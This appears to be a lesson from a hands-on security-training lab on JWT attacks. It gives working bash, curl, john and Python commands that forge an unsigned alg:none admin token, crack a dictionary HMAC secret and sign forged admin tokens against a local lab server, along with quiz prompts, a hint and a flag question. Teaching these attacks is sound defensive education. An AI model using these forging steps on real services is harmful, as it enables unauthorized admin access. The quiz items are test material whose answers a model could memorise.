title: JWT Security: token attacks
description: Break real JWTs: algorithm none, weak secret cracking and token forging with a dedicated lab.

1.title: JWT anatomy and the alg:none attack
1.body:
## The 3 parts of a JWT

```text
eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9 . SflKxwRJSMeKKF2QT4
└─── header (alg) ──┘   └────── payload (claims) ──────────────┘   └─ signature ─┘
```

Decode each part (they are base64url):

```bash
# In the lab, copy your token from the main page and decode it:
echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d    # {"alg":"HS256"}
echo 'eyJ1c2VyIjoiZ3Vlc3Q... ' | base64 -d # {"user":"guest","role":"user"}
```

## The alg:none attack

A JWT's signature is verified ONLY if the algorithm requires it. If you change the header to
`"alg":"none"`, many servers (wrongly) accept the token without verifying it:

```bash
# 1. Build the malicious header
HEADER=$(echo -n '{"alg":"none"}' | base64 | tr -d '=' | tr '/+' '_-')

# 2. Build the payload with role:admin
PAYLOAD=$(echo -n '{"user":"hacker","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')

# 3. Unsigned token (note the empty trailing dot)
TOKEN="${HEADER}.${PAYLOAD}."

# 4. Send it
curl "http://127.0.0.1:18094/login?token=${TOKEN}"
```

The response contains all 3 flags — the server accepted the unsigned token because
the header said `alg:none`.

jwt-security-t01-q01.prompt: How many parts does a JWT have separated by dots?

jwt-security-t01-q02.prompt: What JWT algorithm requires no signature?

jwt-security-t01-q03.prompt: Submit the flag obtained by using alg:none with role:admin.
jwt-security-t01-q03.hint: Decode your token, change alg to none and role to admin, remove the signature, send it to /login

2.title: Weak secret: crack and forge tokens
2.body:
## Cracking the secret

The `/crack` endpoint gives you a SHA256 hash of the secret:

```bash
curl http://127.0.0.1:18094/crack
# {"hash": "e88040e7d0052...", "hint": "common phrase, rockyou top 1000"}

# Crack it with hashcat or john:
echo 'e88040e7d0052eeb5dcf0fd834e4835ff329b275e6a9889058e8d16c38da9514' > hash.txt
john --wordlist=rockyou.txt --format=raw-sha256 hash.txt
# Result: jwt_secret
```

## Forging a signed token

Now that you know the secret (`jwt_secret`), you can sign VALID tokens:

```bash
# With Python:
python3 -c "
import hmac, hashlib, base64, json

secret = 'jwt_secret'
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()
sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{header}.{payload}.{sig}')
"

# Or with the jwt_tool utility:
python3 jwt_tool.py <original_token> -S hs256 -pc role -pv admin -p Secret jwt_secret
```

## The comparison: a strong secret

The `/strong` endpoint uses a secret of 50+ random characters:

```bash
curl http://127.0.0.1:18094/strong
# Try cracking that hash — you won't manage it within the lifetime of the universe
```

**Lesson**: JWT secrets must be LONG (256+ bits) and random. A dictionary
secret turns your "secure authentication" into a worthless piece of paper.
